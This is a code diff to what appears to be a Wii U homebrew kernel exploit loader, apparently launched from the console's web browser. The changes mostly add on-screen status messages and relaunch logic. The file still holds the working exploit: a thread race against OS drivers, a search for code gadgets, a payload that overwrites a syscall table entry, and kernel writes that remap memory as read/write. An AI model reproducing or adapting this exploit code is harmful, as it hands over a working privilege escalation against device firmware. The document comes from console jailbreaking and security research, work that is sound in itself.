@@ -1,28 +1,38 @@
 #include "loader.h"
 
-void printChar(char *buf);
+//comment out the line below for loadiine-style memory mapping
+//#define LOADIINE_MEM_MAP 1
+
+void wait(unsigned int t);
+void doBrowserShutdown(unsigned int coreinit_handle);
+void setupOSScreen(unsigned int coreinit_handle);
+void printOSScreenMsg(char *buf,unsigned int pos);
+void exitOSScreen(unsigned int coreinit_handle);
+void callSysExit(unsigned int coreinit_handle, void *sysFunc);
+
 /* Initial setup code stolen from Pong, makes race much more reliable */
 void _start()
 {
-	// Notify the user if the kernel version is not implemented
-	if(KERN_SYSCALL_TBL == 0)
-	{
-		OSFatal("Your kernel version has not been implemented yet");
-	}
-
 	//Load a good stack
 	asm(
 		"lis %r1, 0x1ab5 ;"
 		"ori %r1, %r1, 0xd138 ;"
 	);
 
-	unsigned int coreinit_handle;
-	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
+	unsigned int coreinit_handle, sysapp_handle;
+	OSDynLoad_Acquire("coreinit", &coreinit_handle);
+	OSDynLoad_Acquire("sysapp", &sysapp_handle);
+	//needed to not destroy screen
+	doBrowserShutdown(coreinit_handle);
+	//prints out first message as well
+	setupOSScreen(coreinit_handle);
 
-	//OSScreen functions
-	void(*OSScreenInit)();
-	unsigned int(*OSScreenGetBufferSizeEx)(unsigned int bufferNum);
-	unsigned int(*OSScreenSetBufferEx)(unsigned int bufferNum, void * addr);
+	if(KERN_SYSCALL_TBL == 0)
+	{
+		printOSScreenMsg("Your kernel version has not been implemented yet.",1);
+		wait(0x3FFFFFFF);
+		exitOSScreen(coreinit_handle);
+	}
 
 	//OS Memory functions
 	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
@@ -37,22 +47,15 @@ void _start()
 	/* OS thread functions */
 	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
 	int32_t (*OSResumeThread)(void *thread);
-	void (*OSYieldThread)();
-	
-	//IM functions
-	int(*IM_SetDeviceState)(int fd, void *mem, int state, int a, int b);
-	int(*IM_Close)(int fd);
-	int(*IM_Open)();
 
 	/* Exit functions */
 	void (*__PPCExit)();
 	void (*_Exit)();
 
-	/* Read the addresses of the functions */
-	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenInit", &OSScreenInit);
-	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenGetBufferSizeEx", &OSScreenGetBufferSizeEx);
-	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenSetBufferEx", &OSScreenSetBufferEx);
+	int(*SYSSwitchToBrowser)(void *args);
+	int(*SYSLaunchSettings)(void *args);
 
+	/* Read the addresses of the functions */
 	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
 	OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &memcpy);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
@@ -64,26 +67,12 @@ void _start()
 	
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
-	OSDynLoad_FindExport(coreinit_handle, 0, "OSYieldThread", &OSYieldThread);
-	
-	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);
-	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
-	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);
-	
+
 	OSDynLoad_FindExport(coreinit_handle, 0, "__PPCExit", &__PPCExit);
 	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);
-	
-	//Restart system to get lib access
-	int fd = IM_Open();
-	void *mem = OSAllocFromSystem(0x100, 64);
-	memset(mem, 0, 0x100);
-	//set restart flag to force quit browser
-	IM_SetDeviceState(fd, mem, 3, 0, 0); 
-	IM_Close(fd);
-	OSFreeToSystem(mem);
-	//wait a bit for browser end
-	unsigned int t1 = 0x1FFFFFFF;
-	while(t1--) ;
+
+	OSDynLoad_FindExport(sysapp_handle, 0, "SYSSwitchToBrowser", &SYSSwitchToBrowser);
+	OSDynLoad_FindExport(sysapp_handle, 0, "SYSLaunchSettings", &SYSLaunchSettings);
 
 	/* Skip the whole exploit if 0xa0000000 is already mapped */
 	if (OSEffectiveToPhysical((void*)0xa0000000) != 0)
@@ -102,8 +91,12 @@ void _start()
 	bool ret2 = OSCreateThread(thread2, _Exit, 0, NULL, stack2 + 0x300, 0x300, 0, 4);
 	if (ret0 == false || ret2 == false)
 	{
-		OSFatal("Failed to create threads");
+		printOSScreenMsg("Failed to create threads! Please try again.",1);
+		wait(0x2FFFFFFF);
+		exitOSScreen(coreinit_handle);
 	}
+
+	printOSScreenMsg("Running Exploit...",1);
 
 	/* Find a bunch of gadgets */
 	uint32_t sleep_addr;
@@ -211,7 +204,10 @@ void _start()
 	uint32_t status = Register(drva_name, 4, NULL, NULL) | Register(drvb_name, 4, NULL, NULL);
 	if (status != 0)
 	{
-		OSFatal("Register() of driver A and B failed");
+		printOSScreenMsg("Register() of driver A and B failed! Reloading kernel...",2);
+		wait(0x2FFFFFFF);
+		callSysExit(coreinit_handle,SYSLaunchSettings);
+		exitOSScreen(coreinit_handle);
 	}
 
 	/* Generate the copy payload, which writes to syscall_table[0x34] */
@@ -219,7 +215,10 @@ void _start()
 	uint32_t *copy_payload = OSAllocFromSystem(0x1000, 0x20);
 	if (!copy_payload)
 	{
-		OSFatal("Failed to allocate payload");
+		printOSScreenMsg("Failed to allocate payload! Reloading kernel...",2);
+		wait(0x2FFFFFFF);
+		callSysExit(coreinit_handle,SYSLaunchSettings);
+		exitOSScreen(coreinit_handle);
 	}
 	copy_payload[0] = 0x01234567;
 	copy_payload[0xfb4/4] = 0x44525648;
@@ -263,30 +262,10 @@ void _start()
 	status = CopyFromSaveArea(drvhax_name, 6, &result, 4);
 	if (result != KERN_CODE_READ)
 	{
-		//Call the Screen initilzation function.
-		OSScreenInit();
-		//Grab the buffer size for each screen (TV and gamepad)
-		int buf0_size = OSScreenGetBufferSizeEx(0);
-		int buf1_size = OSScreenGetBufferSizeEx(1);
-		//Set the buffer area.
-		OSScreenSetBufferEx(0, (void *)0xF4000000);
-		OSScreenSetBufferEx(1, (void *)0xF4000000 + buf0_size);
-		//Clear both framebuffers.
-		int ii;
-		for (ii = 0; ii < 2; ii++)
-		{
-			fillScreen(0,0,0,0);
-			flipBuffers();
-		}
-		printChar("Race attack failed! Please enter the system settings and exit\nthem before retrying.");
-		t1 = 0x3FFFFFFF;
-		while(t1--) ;
-		for(ii = 0; ii < 2; ii++)
-		{
-			fillScreen(0,0,0,0);
-			flipBuffers();
-		}
-		_Exit();
+		printOSScreenMsg("Race attack failed! Reloading kernel...",2);
+		wait(0x2FFFFFFF);
+		callSysExit(coreinit_handle,SYSLaunchSettings);
+		exitOSScreen(coreinit_handle);
 	}
 
 	/* Search the kernel heap for DRVA and DRVHAX */
@@ -306,23 +285,160 @@ void _start()
 		/* Go to the previous metadata entry */
 		metadata_addr -= 0x10;
 	}
-	if (!(drva_addr && drvhax_addr)) OSFatal("Failed to find DRVA or DRVHAX");
-
+	if (!(drva_addr && drvhax_addr))
+	{
+		printOSScreenMsg("Failed to find DRVA or DRVHAX! Reloading kernel...",2);
+		wait(0x2FFFFFFF);
+		callSysExit(coreinit_handle,SYSLaunchSettings);
+		exitOSScreen(coreinit_handle);
+	}
 	/* Make DRVHAX point to DRVA to ensure a clean exit */
 	kern_write((void*)(drvhax_addr + 0x48), drva_addr);
 
-	/* Map the loader and coreinit as RW before exiting */
-#if (VER<410)
+	//map (mostly unused) memory area to specific MEM2 region
+#if (VER<410) //start of region on old FWs
 	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x30000000);
-#else
-	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x31000000);
+#else //newer FWs use different mappings
+	#ifdef LOADIINE_MEM_MAP //start of region
+		kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x10000000);
+	#else //only around coreinit region
+		kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x31000000);
+	#endif
 #endif
+	//give that memory area read/write permissions
 	kern_write((void*)(KERN_ADDRESS_TBL + (0x13 * 4)), 0x28305800);
-	_Exit();
+
+	printOSScreenMsg("Success! Restarting browser...",2);
+	wait(0x1FFFFFFF);
+	callSysExit(coreinit_handle,SYSSwitchToBrowser);
+	exitOSScreen(coreinit_handle);
 
 after_exploit: ;
 	/* Put stuff here that requires an exploited kernel, 
 	   and it will run the second time you launch this webpage */
+	printOSScreenMsg("Exploit already succeeded! Restarting browser...",1);
+	wait(0x1FFFFFFF);
+	callSysExit(coreinit_handle,SYSSwitchToBrowser);
+	exitOSScreen(coreinit_handle);
+}
+
+void wait(unsigned int t)
+{
+	while(t--) ;
+}
+
+void doBrowserShutdown(unsigned int coreinit_handle)
+{
+	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
+	void*(*OSAllocFromSystem)(uint32_t size, int align);
+	void (*OSFreeToSystem)(void *ptr);
+
+	int(*IM_SetDeviceState)(int fd, void *mem, int state, int a, int b);
+	int(*IM_Close)(int fd);
+	int(*IM_Open)();
+
+	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
+
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);
+
+	//Restart system to get lib access
+	int fd = IM_Open();
+	void *mem = OSAllocFromSystem(0x100, 64);
+	memset(mem, 0, 0x100);
+	//set restart flag to force quit browser
+	IM_SetDeviceState(fd, mem, 3, 0, 0); 
+	IM_Close(fd);
+	OSFreeToSystem(mem);
+	//wait a bit for browser end
+	wait(0x1FFFFFFF);
+}
+
+void printOSScreenMsg(char *buf,unsigned int pos)
+{
+	int i;
+	for(i=0;i<2;i++)
+	{
+		drawString(0,pos,buf);
+		flipBuffers();
+	}
+}
+
+void setupOSScreen(unsigned int coreinit_handle)
+{
+	void(*OSScreenInit)();
+	unsigned int(*OSScreenGetBufferSizeEx)(unsigned int bufferNum);
+	unsigned int(*OSScreenSetBufferEx)(unsigned int bufferNum, void * addr);
+
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenInit", &OSScreenInit);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenGetBufferSizeEx", &OSScreenGetBufferSizeEx);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenSetBufferEx", &OSScreenSetBufferEx);
+
+	//Call the Screen initilzation function.
+	OSScreenInit();
+	//Grab the buffer size for each screen (TV and gamepad)
+	int buf0_size = OSScreenGetBufferSizeEx(0);
+	int buf1_size = OSScreenGetBufferSizeEx(1);
+	//Set the buffer area.
+	OSScreenSetBufferEx(0, (void *)0xF4000000);
+	OSScreenSetBufferEx(1, (void *)0xF4000000 + buf0_size);
+	//Clear both framebuffers.
+	int ii;
+	for (ii = 0; ii < 2; ii++)
+	{
+		fillScreen(0,0,0,0);
+		flipBuffers();
+	}
+	printOSScreenMsg("OSDriver Kernel Exploit",0);
+}
+
+void exitOSScreen(unsigned int coreinit_handle)
+{
+	void (*_Exit)();
+	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);
+	//exit only works like this
+	int ii;
+	for(ii = 0; ii < 2; ii++)
+	{
+		fillScreen(0,0,0,0);
+		flipBuffers();
+	}
+	_Exit();
+}
+
+void callSysExit(unsigned int coreinit_handle, void *sysFunc)
+{
+	void*(*OSAllocFromSystem)(uint32_t size, int align);
+	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
+	int32_t (*OSResumeThread)(void *thread);
+	int (*OSIsThreadTerminated)(void *thread);
+
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSIsThreadTerminated", &OSIsThreadTerminated);
+
+	uint32_t stack1 = (uint32_t) OSAllocFromSystem(0x300, 0x20);
+	void *thread1 = OSAllocFromSystem(OSTHREAD_SIZE, 8);
+
+	OSCreateThread(thread1, sysFunc, 0, NULL, stack1 + 0x300, 0x300, 0, 0x1A);
+	OSResumeThread(thread1);
+	while(OSIsThreadTerminated(thread1) == 0)
+	{
+		asm volatile (
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		);
+	}
 }
 
 /* Simple memcmp() implementation */
@@ -416,14 +532,4 @@ void kern_write(void *addr, uint32_t value)
 		:	"memory", "ctr", "lr", "0", "3", "4", "5", "6", "7", "8", "9", "10",
 			"11", "12"
 		);
-}
-
-void printChar(char *buf)
-{
-	int i;
-	for(i=0;i<2;i++)
-	{
-		drawString(0,0,buf);
-		flipBuffers();
-	}
 }
